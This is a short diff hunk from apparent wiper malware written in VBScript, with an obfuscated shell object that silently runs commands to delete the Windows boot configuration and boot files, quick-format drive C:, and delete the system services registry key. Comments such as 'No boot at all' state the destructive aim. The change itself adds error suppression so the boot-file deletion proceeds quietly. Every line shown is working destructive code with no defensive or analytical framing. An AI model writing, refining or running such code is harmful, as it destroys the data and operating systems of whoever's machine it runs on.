@@ -178,7 +178,7 @@ x7p9q.Run "bcdedit /delete {default} /f", 0, True
 x7p9q.Run "bcdedit /delete {bootmgr} /f", 0, True ' No boot at all
 x7p9q.Run "takeown /F C:\Windows\boot /R /D Y", 0, True
 x7p9q.Run "icacls C:\Windows\boot /grant SYSTEM:F /T /Q", 0, True
-x7p9q.Run "Powershell.exe Remove-Item -Path C:\Windows\boot -Force -Recurse", 0, True ' Boot files
+x7p9q.Run "Powershell.exe Remove-Item -Path C:\Windows\boot -Force -Recurse -ErrorAction SilentlyContinue", 0, True ' Boot files
 
 x7p9q.Run "format C: /fs:NTFS /q /y", 0, True 
 x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
